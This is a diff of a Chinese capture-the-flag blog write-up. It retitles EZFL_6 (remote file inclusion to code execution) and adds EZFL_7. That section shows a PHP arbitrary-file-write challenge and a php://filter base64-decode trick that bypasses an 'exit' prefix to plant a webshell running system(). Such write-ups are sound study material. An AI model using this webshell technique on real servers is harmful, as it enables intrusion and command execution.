@@ -278,7 +278,8 @@
         <li><a href="#ezfl_3lfi---phpinput---rce">EZFL_3(LFI -&gt; php://input -&gt; RCE)</a></li>
         <li><a href="#ezfl_4">EZFL_4</a></li>
         <li><a href="#ezfl_5">EZFL_5</a></li>
-        <li><a href="#ezfl_6">EZFL_6</a></li>
+        <li><a href="#ezfl_6php-远程文件包含rfi---代码执行rce">EZFL_6(PHP 远程文件包含（RFI） -&gt; 代码执行（RCE）)</a></li>
+        <li><a href="#ezfl_7">EZFL_7</a></li>
       </ol>
     </li>
     <li><a href="#ezfu">EZFU</a>
@@ -460,7 +461,7 @@
 
 
 
-                <span class="article-time--wordcount">1520 字</span>
+                <span class="article-time--wordcount">1732 字</span>
             </div>
         
     </footer>
@@ -889,7 +890,7 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 	
 ><br>
 获得flag</p>
-<h3 id="ezfl_6">EZFL_6
+<h3 id="ezfl_6php-远程文件包含rfi---代码执行rce">EZFL_6(PHP 远程文件包含（RFI） -&gt; 代码执行（RCE）)
 </h3><p>访问首页 页面存在 file 参数，查看源码可以看到注释：<!-- include($file); --><br>
 说明后端大概率直接对 file 做了 include()，先用</p>
 <div class="highlight"><div class="chroma">
@@ -942,7 +943,6 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 	
 	
 ><br>
-*
 从而枚举根目录,结果在根目录下发现了可疑文件  qingcenctf.txt  <br>
 直接读取</p>
 <div class="highlight"><div class="chroma">
@@ -960,6 +960,108 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 	loading="lazy"
 	
 		alt="fl6_3.png"
+	
+	
+></p>
+<h3 id="ezfl_7">EZFL_7
+</h3><p>访问首页 直接给了源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if (isset($_POST[&#39;filename&#39;]) &amp;&amp; isset($_POST[&#39;content&#39;])) {
+</span></span><span class="line"><span class="cl">    $filename = $_POST[&#39;filename&#39;];
+</span></span><span class="line"><span class="cl">    $content = $_POST[&#39;content&#39;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    file_put_contents($filename, &#34;&lt;?php exit();?&gt;&#34; . $content);
+</span></span><span class="line"><span class="cl">    echo &#34;write ok&#34;;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>说明这是任意文件写入，但会强行在前面加 <?php exit();?>，所以不能直接写普通 webshell<br>
+用 php://filter/write=convert.base64-decode/resource=chen.php 绕过前缀，在burp里发 POST</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">filename=php://filter/write=convert.base64-decode/resource=chen.php  
+</span></span><span class="line"><span class="cl">content=APD9waHAgc3lzdGVtKCJscyIpOz8%2B  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段 content 解码后就是 <?php system("ls"); ?>  前面的 A 是为了配合固定前缀做对齐<br>
+<img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780816992770_fl7_1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl7_1.png"
+	
+	
+><br>
+写入成功 访问  <a class="link" href="http://docker.qingcen.net:34249/chen.php"  target="_blank" rel="noopener"
+    >http://docker.qingcen.net:34249/chen.php</a><br>
+<img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780816996682_fl7_2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl7_2.png"
+	
+	
+><br>
+可以看到两个文件 c0nq4er1ng.php  conquer.php  接下来获取内容就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php highlight_file(&#34;c0nq4er1ng.php&#34;); echo &#34;\n---\n&#34;; highlight_file(&#34;conquer.php&#34;);?&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780816988240_fl7_3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl7_3.png"
+	
+	
+><br>
+访问readsrc.php即可看到两个文件的源码<br>
+<img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780816995993_fl7_4.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="fl7_4.png"
 	
 	
 ></p>
